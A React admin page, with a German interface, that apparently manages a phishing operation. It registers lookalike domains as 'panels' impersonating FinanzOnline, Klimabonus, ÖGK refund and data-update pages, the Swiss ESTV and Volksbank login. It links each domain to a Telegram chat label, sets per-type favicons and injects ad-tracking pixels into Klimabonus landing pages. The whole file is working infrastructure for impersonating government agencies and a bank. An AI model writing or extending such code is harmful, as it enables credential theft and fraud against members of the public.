import { useEffect, useState } from "react";
import AdminLayout from "@/components/AdminLayout";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Switch } from "@/components/ui/switch";
import { Textarea } from "@/components/ui/textarea";
import {
  Dialog,
  DialogContent,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { useToast } from "@/hooks/use-toast";
import { Trash2, Globe, Pencil, Code2 } from "lucide-react";
import PanelTypeEditor, { type PanelType } from "@/components/PanelTypeEditor";

interface Panel {
  id: string;
  domain: string;
  type: PanelType;
  created_at: string;
  meta_tag_enabled: boolean;
  meta_tag_snippet: string | null;
}


const TYPE_LABEL: Record<PanelType, string> = {
  finanzonline: "FinanzOnline",
  klimabonus: "Klimabonus",
  oegk_rueckerstattung: "OEGK-Rückerstattung",
  oegk_datenaktualisierung: "OEGK-Datenaktualisierung",
  estv: "ESTV Datenaktualisierung",
  volksbank_login: "Volksbank",
};

const TYPE_OPTIONS: PanelType[] = ["finanzonline", "klimabonus", "oegk_rueckerstattung", "oegk_datenaktualisierung", "estv", "volksbank_login"];


interface TelegramChat {
  id: string;
  label: string;
  domains: string[];
}

const NONE_VALUE = "__none__";

const DEFAULT_FAVICON = "/favicon.png";

const AdminPanels = () => {
  const { toast } = useToast();
  const [panels, setPanels] = useState<Panel[]>([]);
  const [loading, setLoading] = useState(true);
  const [newDomain, setNewDomain] = useState("");
  const [newType, setNewType] = useState<PanelType>("finanzonline");
  const [adding, setAdding] = useState(false);
  const [editorType, setEditorType] = useState<PanelType | null>(null);
  const [telegramChats, setTelegramChats] = useState<TelegramChat[]>([]);
  const [newTelegramChatId, setNewTelegramChatId] = useState<string>(NONE_VALUE);
  const [typeFavicons, setTypeFavicons] = useState<Record<string, string | null>>({});
  const [snippetPanel, setSnippetPanel] = useState<Panel | null>(null);
  const [snippetDraft, setSnippetDraft] = useState("");
  const [savingSnippet, setSavingSnippet] = useState(false);


  const loadTypeFavicons = async () => {
    const { data } = await supabase
      .from("panel_type_settings")
      .select("type, favicon_url");
    const map: Record<string, string | null> = {};
    (data || []).forEach((row: { type: string; favicon_url: string | null }) => {
      map[row.type] = row.favicon_url;
    });
    setTypeFavicons(map);
  };

  const load = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("panels")
      .select("*")
      .order("created_at", { ascending: false });
    if (error) {
      toast({ title: "Fehler", description: error.message, variant: "destructive" });
    } else {
      setPanels((data || []) as Panel[]);
    }
    setLoading(false);
  };

  const loadTelegramChats = async () => {
    const { data } = await supabase
      .from("telegram_chat_ids")
      .select("id, label, domains")
      .not("label", "is", null)
      .order("label", { ascending: true });
    setTelegramChats(
      (data || [])
        .filter((d) => d.label)
        .map((d) => ({
          id: d.id as string,
          label: d.label as string,
          domains: (d.domains as string[] | null) ?? [],
        }))
    );
  };

  useEffect(() => {
    load();
    loadTelegramChats();
    loadTypeFavicons();
  }, []);

  const handleAdd = async () => {
    const domain = newDomain.trim().toLowerCase().replace(/^www\./, "");
    if (!domain) return;
    setAdding(true);
    const { error } = await supabase
      .from("panels")
      .insert({ domain, type: newType });

    if (error) {
      setAdding(false);
      toast({ title: "Fehler", description: error.message, variant: "destructive" });
      return;
    }

    // Optional: Domain in den gewählten Telegram-Chat eintragen
    if (newTelegramChatId !== NONE_VALUE) {
      const chat = telegramChats.find((c) => c.id === newTelegramChatId);
      if (chat && !chat.domains.includes(domain)) {
        const updatedDomains = [...chat.domains, domain];
        const { error: tgError } = await supabase
          .from("telegram_chat_ids")
          .update({ domains: updatedDomains })
          .eq("id", chat.id);
        if (tgError) {
          toast({
            title: "Panel hinzugefügt, Telegram-Update fehlgeschlagen",
            description: tgError.message,
            variant: "destructive",
          });
        } else {
          toast({
            title: "Panel hinzugefügt",
            description: `${domain} – Telegram-Label "${chat.label}" verknüpft`,
          });
        }
        loadTelegramChats();
      } else {
        toast({ title: "Panel hinzugefügt", description: domain });
      }
    } else {
      toast({ title: "Panel hinzugefügt", description: domain });
    }

    setAdding(false);
    setNewDomain("");
    setNewTelegramChatId(NONE_VALUE);
    load();
  };

  const handleDelete = async (id: string) => {
    if (!confirm("Wirklich löschen?")) return;
    const { error } = await supabase.from("panels").delete().eq("id", id);
    if (error) {
      toast({ title: "Fehler", description: error.message, variant: "destructive" });
    } else {
      toast({ title: "Gelöscht" });
      load();
    }
  };

  const handleMetaToggle = async (p: Panel, enabled: boolean) => {
    const { error } = await supabase
      .from("panels")
      .update({ meta_tag_enabled: enabled } as any)
      .eq("id", p.id);
    if (error) {
      toast({ title: "Fehler", description: error.message, variant: "destructive" });
    } else {
      load();
    }
  };

  const handleSnippetSave = async () => {
    if (!snippetPanel) return;
    setSavingSnippet(true);
    const { error } = await supabase
      .from("panels")
      .update({ meta_tag_snippet: snippetDraft } as any)
      .eq("id", snippetPanel.id);
    setSavingSnippet(false);
    if (error) {
      toast({ title: "Fehler", description: error.message, variant: "destructive" });
    } else {
      toast({ title: "Snippet gespeichert" });
      setSnippetPanel(null);
      load();
    }
  };


  const handleTypeChange = async (id: string, type: PanelType) => {
    const { error } = await supabase
      .from("panels")
      .update({ type })
      .eq("id", id);
    if (error) {
      toast({ title: "Fehler", description: error.message, variant: "destructive" });
    } else {
      load();
    }
  };

  const TypeRow = ({ t }: { t: PanelType }) => (
    <span className="px-2 py-1.5 block">{TYPE_LABEL[t]}</span>
  );

  return (
    <AdminLayout>
      <div className="max-w-4xl mx-auto">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-blue-600 text-white">
            <Globe className="h-5 w-5" />
          </div>
          <div>
            <h1 className="text-2xl font-semibold text-slate-900">Panels</h1>
            <p className="text-sm text-slate-500">
              Verwalten Sie Domains, deren Panel-Typ und das Favicon je Typ.
            </p>
          </div>
        </div>

        {/* Add Form */}
        <div className="mb-6 rounded-lg border border-slate-200 bg-white p-5 shadow-sm">
          <h2 className="mb-4 text-sm font-semibold text-slate-700">
            Neues Panel hinzufügen
          </h2>
          <div className="flex flex-col gap-3 md:flex-row md:items-end">
            <div className="flex-1">
              <label className="mb-1 block text-xs font-medium text-slate-600">
                Domain
              </label>
              <Input
                placeholder="z.B. klima-bonus.at"
                value={newDomain}
                onChange={(e) => setNewDomain(e.target.value)}
              />
            </div>
            <div className="w-full md:w-64">
              <label className="mb-1 block text-xs font-medium text-slate-600">
                Typ
              </label>
              <Select
                value={newType}
                onValueChange={(v) => setNewType(v as PanelType)}
              >
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {TYPE_OPTIONS.map((t) => (
                    <SelectItem key={t} value={t} className="p-0">
                      <TypeRow t={t} />
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>

            </div>
            <div className="w-full md:w-56">
              <label className="mb-1 block text-xs font-medium text-slate-600">
                Telegram-Label (optional)
              </label>
              <Select
                value={newTelegramChatId}
                onValueChange={setNewTelegramChatId}
              >
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value={NONE_VALUE}>– keines –</SelectItem>
                  {telegramChats.map((c) => (
                    <SelectItem key={c.id} value={c.id}>
                      {c.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <Button
              onClick={handleAdd}
              disabled={!newDomain.trim() || adding}
              className="md:w-32"
            >
              {adding ? "..." : "Hinzufügen"}
            </Button>
          </div>
        </div>

        {/* Panel Types / Favicons */}
        <div className="mb-6 rounded-lg border border-slate-200 bg-white p-5 shadow-sm">
          <h2 className="mb-4 text-sm font-semibold text-slate-700">
            Panel-Typen / Favicons
          </h2>
          <div className="grid grid-cols-2 gap-3 md:grid-cols-4">
            {TYPE_OPTIONS.map((t) => {
              const fav = typeFavicons[t];
              return (
                <div
                  key={t}
                  className="flex flex-col items-center gap-2 rounded-lg border border-slate-200 bg-slate-50 p-4 text-center"
                >
                  <img
                    src={fav ?? DEFAULT_FAVICON}
                    alt=""
                    className="h-10 w-10 rounded border border-slate-200 bg-white object-contain"
                  />
                  <div className="text-sm font-medium text-slate-800">
                    {TYPE_LABEL[t]}
                  </div>
                  <div className="text-[11px] text-slate-500">
                    {fav ? "Eigenes Favicon" : "Standard-Favicon"}
                  </div>
                  <Button
                    type="button"
                    size="sm"
                    variant="outline"
                    onClick={() => setEditorType(t)}
                    className="mt-1"
                  >
                    <Pencil className="mr-1 h-3.5 w-3.5" />
                    Bearbeiten
                  </Button>
                </div>
              );
            })}
          </div>
        </div>

        {/* List */}
        <div className="rounded-lg border border-slate-200 bg-white shadow-sm">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Domain</TableHead>
                <TableHead className="w-64">Typ</TableHead>
                <TableHead className="w-56">Meta Tag</TableHead>
                <TableHead className="w-40">Erstellt</TableHead>
                <TableHead className="w-20"></TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {loading && (
                <TableRow>
                  <TableCell colSpan={5} className="text-center text-sm text-slate-400 py-8">
                    Laden...
                  </TableCell>
                </TableRow>
              )}
              {!loading && panels.length === 0 && (
                <TableRow>
                  <TableCell colSpan={5} className="text-center text-sm text-slate-400 py-8">
                    Keine Panels vorhanden.
                  </TableCell>
                </TableRow>
              )}
              {panels.map((p) => {
                const supportsMeta = p.type === "klimabonus";
                return (
                <TableRow key={p.id}>
                  <TableCell className="font-medium">{p.domain}</TableCell>
                  <TableCell>
                    <Select
                      value={p.type}
                      onValueChange={(v) => handleTypeChange(p.id, v as PanelType)}
                    >
                      <SelectTrigger className="h-9">
                        <SelectValue>{TYPE_LABEL[p.type]}</SelectValue>
                      </SelectTrigger>
                      <SelectContent>
                        {TYPE_OPTIONS.map((t) => (
                          <SelectItem key={t} value={t} className="p-0">
                            <TypeRow t={t} />
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </TableCell>

                  <TableCell>
                    {supportsMeta ? (
                      <div className="flex items-center gap-2">
                        <Switch
                          checked={p.meta_tag_enabled}
                          onCheckedChange={(v) => handleMetaToggle(p, v)}
                        />
                        {p.meta_tag_enabled && (
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => {
                              setSnippetPanel(p);
                              setSnippetDraft(p.meta_tag_snippet ?? "");
                            }}
                          >
                            <Code2 className="mr-1 h-3.5 w-3.5" />
                            Snippet
                          </Button>
                        )}
                      </div>
                    ) : (
                      <span className="text-xs text-slate-400">nur Klimabonus</span>
                    )}
                  </TableCell>

                  <TableCell className="text-sm text-slate-500">
                    {new Date(p.created_at).toLocaleDateString("de-DE")}
                  </TableCell>
                  <TableCell>
                    <Button
                      variant="ghost"
                      size="icon"
                      onClick={() => handleDelete(p.id)}
                    >
                      <Trash2 className="h-4 w-4 text-red-500" />
                    </Button>
                  </TableCell>
                </TableRow>
                );
              })}

            </TableBody>
          </Table>
        </div>
      </div>

      {editorType && (
        <PanelTypeEditor
          open={!!editorType}
          onOpenChange={(open) => {
            if (!open) setEditorType(null);
          }}
          type={editorType}
          typeLabel={TYPE_LABEL[editorType]}
          onSaved={loadTypeFavicons}
        />
      )}

      <Dialog open={!!snippetPanel} onOpenChange={(o) => { if (!o) setSnippetPanel(null); }}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle>Meta-Tag Snippet</DialogTitle>
            <DialogDescription>
              HTML-Snippet (z.B. Facebook Pixel). Wird nur auf der Klimabonus-Landingpage von
              <span className="font-medium"> {snippetPanel?.domain}</span> in den &lt;head&gt; injiziert.
            </DialogDescription>
          </DialogHeader>
          <Textarea
            value={snippetDraft}
            onChange={(e) => setSnippetDraft(e.target.value)}
            rows={12}
            placeholder={'<!-- Meta Pixel Code -->\n<script>\n!function(f,b,e,v,n,t,s){...}\nfbq(\'init\', \'YOUR_PIXEL_ID\');\nfbq(\'track\', \'PageView\');\n</script>'}
            className="font-mono text-xs"
          />
          <DialogFooter>
            <Button variant="outline" onClick={() => setSnippetPanel(null)}>Abbrechen</Button>
            <Button onClick={handleSnippetSave} disabled={savingSnippet}>
              {savingSnippet ? "Speichere…" : "Speichern"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </AdminLayout>

  );
};

export default AdminPanels;
